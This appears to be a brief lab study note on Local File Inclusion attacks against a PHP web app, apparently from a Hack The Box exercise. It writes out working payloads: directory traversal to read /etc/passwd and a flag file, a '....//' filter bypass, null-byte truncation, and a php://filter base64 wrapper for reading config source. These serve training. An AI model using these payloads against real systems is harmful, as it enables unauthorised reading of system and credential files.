## <span style=color:red>LFI</span>
![](https://hackmd.io/_uploads/r1jGIWkA3.png)

```It may be pulling the content from a different database table based on the specified parameter, or it may be loading an entirely different version of the web app.``` 

```If absolute file path is '/var/www/html/languages/', using '/../../../../etc/passwd' to reach the root path '/' and see the file'/etc/passwd'.```

#### Payload
```url!
http://94.237.59.206:54282/index.php?language=/../../../../usr/share/flags/flag.txt
```

### <span style=color:red>LFI Bypass</span>
```url!
....//....//....//....//
```

#### Path Truncation (Extension)
```url!
%00
```

### <span style=color:red>PHP Stream Wrapper</span>
#### Payolad
```specifying convert.base64-encode for the read parameter and config for the resource parameter```
```url!
php://filter/read=convert.base64-encode/resource=config
```

#### Decode
```bash!
H4ck3rxPK@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

